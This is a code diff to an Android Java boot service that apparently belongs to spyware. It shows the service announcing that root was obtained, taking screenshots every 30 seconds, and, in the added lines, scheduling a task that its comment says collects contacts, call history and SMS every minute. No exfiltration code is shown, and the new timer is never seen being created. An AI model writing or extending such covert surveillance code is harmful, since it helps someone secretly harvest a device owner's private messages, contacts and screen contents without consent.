@@ -22,13 +22,17 @@ import android.util.Log;
  */
 public class BootService extends Service 
 {
-	private final long mScreenshotDelay  = 3000;  // 3  Seconds
-	private final long mScreenshotPeriod = 30000; // 30 Seconds
-
 	private final String LOGTAG = "BootService";
 	
-	private Timer mTimer;
+	private Timer mGetInfoTimer;
+	private GetInfoTask mInfoTask;
+	private final long mGetInfoDelay  = 10000; // 10 Seconds
+	private final long mGetInfoPeriod = 60000; // 60 Seconds
+	
+	private Timer mScreenshotTimer;
 	private CaptureTask mCapTask;
+	private final long mScreenshotDelay  = 3000;  // 3  Seconds
+	private final long mScreenshotPeriod = 30000; // 30 Seconds
 
 	@Override
 	public IBinder onBind(final Intent intent) {
@@ -60,15 +64,20 @@ public class BootService extends Service
         }
         SysUtils.messageBox(getApplicationContext(), "get root successfully");
 		
-		mTimer = new Timer();
-		mCapTask = new CaptureTask();
+		mScreenshotTimer = new Timer();
+		mCapTask = new CaptureTask(this);
 	}
 
 	@Override
 	public void onStart(final Intent intent, final int startId) {
 		super.onStart(intent, startId);
 		Log.i(LOGTAG, "started");
-		mTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
+		
+		// Start timer to get contacts, phone call history and SMS
+		mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
+		
+		// Start timer to capture screenshot
+		mScreenshotTimer.schedule(mCapTask, mScreenshotDelay, mScreenshotPeriod);
 	}
 	
 	public class IaiaiBinder extends Binder {  
